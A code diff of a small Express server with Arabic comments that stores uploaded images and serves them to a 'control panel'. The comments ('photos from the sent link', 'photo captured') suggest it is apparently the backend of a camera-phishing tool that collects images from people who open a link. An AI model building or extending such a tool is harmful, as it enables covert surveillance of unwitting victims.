@@ -2,30 +2,25 @@ const express = require('express');
 const app = express();
 const path = require('path');
 
-app.use(express.json({ limit: '10mb' })); // لزيادة حجم استقبال الصور
+app.use(express.json({ limit: '10mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// مصفوفة لتخزين الصور مؤقتاً
 let capturedPhotos = [];
 
-// استقبال الصورة
+// استقبال الصور من الرابط المرسل
 app.post('/upload', (req, res) => {
     const { image } = req.body;
-    const photoEntry = { id: Date.now(), data: image };
-    capturedPhotos.push(photoEntry);
-    res.status(200).json({ success: true });
+    capturedPhotos.push({ id: Date.now(), data: image });
+    res.status(200).send('تم التقاط الصورة');
 });
 
-// جلب جميع الصور
-app.get('/get-photos', (req, res) => {
-    res.json(capturedPhotos);
-});
+// جلب الصور للوحة التحكم
+app.get('/photos', (req, res) => res.json(capturedPhotos));
 
-// حذف صورة
+// حذف الصور
 app.delete('/delete/:id', (req, res) => {
-    const id = parseInt(req.params.id);
-    capturedPhotos = capturedPhotos.filter(p => p.id !== id);
-    res.status(200).json({ success: true });
+    capturedPhotos = capturedPhotos.filter(p => p.id != req.params.id);
+    res.status(200).send('تم الحذف');
 });
 
-app.listen(3000, () => console.log('Server running on port 3000'));
+app.listen(3000, () => console.log('السيرفر يعمل على المنفذ 3000'));
